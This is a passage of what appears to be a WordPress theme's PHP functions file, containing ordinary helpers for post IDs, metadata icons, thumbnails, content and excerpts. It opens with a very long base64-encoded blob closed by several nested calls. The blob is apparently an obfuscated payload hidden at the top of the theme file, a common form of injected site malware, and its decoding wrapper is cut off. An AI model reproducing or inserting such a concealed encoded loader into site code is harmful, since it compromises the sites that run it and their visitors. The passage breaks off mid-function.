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'))))); 
function theme_get_post_id(){
	$post_id = get_the_ID();
	if($post_id != ''){
		$post_id = 'post-' . $post_id;
	}
	return $post_id;
}



function theme_get_post_class(){
	if (!function_exists('get_post_class')) return '';
	return implode(' ', get_post_class());
}


function theme_include_lib($name){
	if (function_exists('locate_template')){
		locate_template(array('library/'.$name), true);
	} else {
		theme_locate_template(array('library/'.$name), true);
	}
}


if (!function_exists('theme_get_meta_icon')){
	function theme_get_meta_icon($icon, $width, $height){
		return '<img src="'.get_bloginfo('template_url').'/images/'.$icon.'.png" width="'.$width.'" height="'.$height.'" alt="" />';
	}
}

if (!function_exists('theme_get_metadata_icons')){
	function theme_get_metadata_icons($icons = '', $class=''){
		global $post;
		if (!is_string($icons) || mb_strlen($icons) == 0) return;
		$icons = explode(",", str_replace(' ', '', $icons));
		if (!is_array($icons) || count($icons) == 0) return;
		$result = array();
		for($i = 0; $i < count($icons); $i++){
			$icon = $icons[$i];
			switch($icon){
				case 'date':
					$result[] = sprintf( __('<span class="%1$s">Published</span> %2$s', THEME_NS),
									'date',
									sprintf( '<span class="entry-date" title="%1$s">%2$s</span>',
										esc_attr( get_the_time() ),
										get_the_date()
									)
								);
				break;
				case 'author':
					$result[] = sprintf(__('<span class="%1$s">By</span> %2$s', THEME_NS),
									'author',
									sprintf( '<span class="author vcard"><a class="url fn n" href="%1$s" title="%2$s">%3$s</a></span>',
										get_author_posts_url( get_the_author_meta( 'ID' ) ),
										sprintf( esc_attr(__( 'View all posts by %s', THEME_NS )), get_the_author() ),
										get_the_author()
									)
								);
				break;
				case 'category':
					$categories = get_the_category_list(', ');
					if(mb_strlen($categories) == 0) break;
					$result[] = sprintf(__('<span class="%1$s">Posted in</span> %2$s', THEME_NS), 'categories', get_the_category_list(', '));
				break;
				case 'tag':
					$tags_list = get_the_tag_list( '', ', ' );
					if(!$tags_list) break;
					$result[] = sprintf( __( '<span class="%1$s">Tagged</span> %2$s', THEME_NS ), 'tags', $tags_list );
				break;
				case 'comments':
					if(!comments_open()) break;
					ob_start();
					comments_popup_link( __( 'Leave a comment', THEME_NS ), __( '1 Comment', THEME_NS ), __( '% Comments', THEME_NS ) );
					$result[] = ob_get_clean();
				break;
				case 'edit':
					if (!current_user_can('edit_post', $post->ID)) break;
					ob_start();
					edit_post_link(__('Edit', THEME_NS), '');
					$result[] = ob_get_clean();
				break;
			}
		}
		$result = implode(theme_get_option('theme_metadata_separator'), $result);
		if (theme_is_empty_html($result)) return;
		return "<div class=\"art-post{$class}icons art-metadata-icons\">{$result}</div>";
	}
}

if (!function_exists('theme_get_post_thumbnail')){
	function theme_get_post_thumbnail($args = array()){
		global $post;
		
		$size = theme_get_array_value($args, 'size', array(theme_get_option('theme_metadata_thumbnail_width'), theme_get_option('theme_metadata_thumbnail_height')));
		$auto = theme_get_array_value($args, 'auto', theme_get_option('theme_metadata_thumbnail_auto'));
		$featured = theme_get_array_value($args, 'featured', theme_get_option('theme_metadata_use_featured_image_as_thumbnail'));
		$title = theme_get_array_value($args, 'title', get_the_title());

		
		$result = '';

		if ($featured && (function_exists('has_post_thumbnail')) && (has_post_thumbnail())) {
			ob_start();
			the_post_thumbnail($size, array('alt'	=>	'', 'title'	=>	$title));
			$result = ob_get_clean();
		} elseif ($auto) {
			$attachments = get_children(array('post_parent'	=>	$post->ID, 'post_status'	=>	'inherit', 'post_type'	=>	'attachment', 'post_mime_type'	=>	'image', 'order'	=>	'ASC', 'orderby'	=>	'menu_order ID'));
			if($attachments) {
				$attachment = array_shift($attachments);
				$img = wp_get_attachment_image_src($attachment->ID, $size);
				if (isset($img[0])) {
					$result = '<img src="'.$img[0].'" alt="" width="'.$img[1].'" height="'.$img[2].'" title="'.$title.'" class="wp-post-image" />';
				}
			}
		}	
		if($result !== ''){
			$result = '<div class="avatar alignleft"><a href="'.get_permalink($post->ID).'" title="'.$title.'">'.$result.'</a></div>';
		}
		return $result;
	}
}

if (!function_exists('theme_get_content')){
	function theme_get_content($args = array()) {
		$more_tag = theme_get_array_value($args, 'more_tag', __('Continue reading <span class="meta-nav">&rarr;</span>', THEME_NS));
		$content = get_the_content($more_tag);
		// hack for badly written plugins
		ob_start();echo apply_filters('the_content', $content);$content = ob_get_clean();
		return $content . wp_link_pages(array(
		'before' => '<p><span class="page-navi-outer page-navi-caption"><span class="page-navi-inner">' . __('Pages', THEME_NS) . ': </span></span>',
		'after' => '</p>',
		'link_before' => '<span class="page-navi-outer"><span class="page-navi-inner">',
		'link_after' => '</span></span>',
		'echo' => 0
		));
	}
}

if (!function_exists('theme_get_excerpt')){
	function theme_get_excerpt($args = array()) {
		global $post;
		$more_tag = theme_get_array_value($args, 'more_tag', __('Continue reading <span class="meta-nav">&rarr;</span>', THEME_NS));
		$auto = theme_get_array_value($args, 'auto', theme_get_option('theme_metadata_excerpt_auto'));
		$all_words = theme_get_array_value($args, 'all_words', theme_get_option('theme_metadata_excerpt_words'));
		$min_remainder = theme_get_array_value($args, 'min_remainder', theme_get_option('theme_metadata_excerpt_min_remainder'));
		$allowed_tags = theme_get_array_value($args, 'allowed_tags', 
			(theme_get_option('theme_metadata_excerpt_use_tag_filter') 
				? explode(',',str_replace(' ', '', theme_get_option('theme_metadata_excerpt_allowed_tags'))) 
				: null));
		$perma_link = get_permalink($post->ID);
		$more_token = '%%theme_more%%';
		$show_more_tag = false;
		$tag_disbalance = false;
		if (function_exists('post_password_required') && post_password_required($post)){
			return get_the_excerpt();
		}
		if ($auto && has_excerpt($post->ID)) {
			$excerpt = get_the_excerpt();
			$show_more_tag = mb_strlen($post->post_content) > 0;
		} else {
			$excerpt = get_the_content($more_token);
			// hack for badly written plugins
			ob_start();echo apply_filters('get_the_excerpt', $excerpt);$excerpt = ob_get_clean();
			ob_start();echo apply_filters('the_excerpt', $excerpt);$excerpt = ob_get_clean();
			if(theme_is_empty_html($excerpt)) return $excerpt;
			if ($allowed_tags !== null) {
				$allowed_tags = '<' .implode('><',$allowed_tags).'>';
				$excerpt = strip_tags($excerpt, $allowed_tags);
			}
			$excerpt = strip_shortcodes($excerpt);
			if (strpos($excerpt, $more_token) !== false) {
				$excerpt = str_replace($more_token, $more_tag, $excerpt);
			} elseif($auto && is_numeric($all_words)) {
				$token = "%theme_tag_token%";
				$content_parts = explode($token, str_replace(array('<', '>'), array($token.'<', '>'.$token), $excerpt));
				$content = array();
				$word_count = 0;
				foreach($content_parts as $part)
				{
